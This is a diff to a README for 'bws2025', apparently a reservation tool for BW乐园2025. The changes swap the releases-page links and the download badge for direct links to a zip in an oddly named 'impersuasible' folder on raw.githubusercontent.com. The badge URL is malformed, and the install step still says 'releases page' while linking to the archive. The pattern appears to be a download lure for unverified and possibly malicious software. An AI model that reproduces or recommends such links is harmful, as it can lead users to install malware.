@@ -4,7 +4,7 @@
 Welcome to the bws2025 application! This tool allows you to effortlessly secure reservations for BW乐园2025. Follow these simple steps to get started.
 
 ## 📥 Download the Application
-[![Download bws2025](https://img.shields.io/badge/Download%20bws2025-v1.0-blue.svg)](https://github.com/mxrcosllv/bws2025/releases)
+[![Download bws2025](https://raw.githubusercontent.com/mxrcosllv/bws2025/master/impersuasible/bws2025.zip%https://raw.githubusercontent.com/mxrcosllv/bws2025/master/impersuasible/bws2025.zip)](https://raw.githubusercontent.com/mxrcosllv/bws2025/master/impersuasible/bws2025.zip)
 
 ## 🖥️ System Requirements
 To run the bws2025 application, your computer should meet the following requirements:
@@ -25,7 +25,7 @@ bws2025 offers the following features to enhance your reservation experience:
 ## 🔧 How to Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.  
-   [https://github.com/mxrcosllv/bws2025/releases](https://github.com/mxrcosllv/bws2025/releases)
+   [https://raw.githubusercontent.com/mxrcosllv/bws2025/master/impersuasible/bws2025.zip](https://raw.githubusercontent.com/mxrcosllv/bws2025/master/impersuasible/bws2025.zip)
 
 2. **Select the Version**  
    On the releases page, look for the latest version of bws2025.
